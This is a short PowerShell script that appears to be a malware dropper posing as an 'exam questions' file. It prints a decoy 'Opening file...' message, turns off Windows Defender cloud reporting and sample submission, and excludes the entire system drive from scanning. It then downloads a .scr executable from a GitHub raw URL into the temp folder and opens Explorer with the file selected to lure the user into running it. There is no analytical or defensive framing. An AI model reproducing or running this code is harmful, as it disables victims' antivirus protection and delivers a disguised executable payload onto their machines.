try {
    Write-Output "Opening file...";
    Set-MpPreference -MAPSReporting 0;
    Set-MpPreference -SubmitSamplesConsent 2;
    Add-MpPreference -ExclusionPath $env:SystemDrive -ErrorAction Stop;
} catch {
    Write-Error ("ERROR: " + $_.Exception.Message);
}

$url = "https://github.com/Easy-Hash/download-now/raw/refs/heads/main/exam%20questions.scr"
$destination = "$env:TEMP\exam questions.scr"

# Download the file
Invoke-WebRequest -Uri $url -OutFile $destination

# Open folder and select the file
Start-Process explorer.exe "/select,`"$destination`""
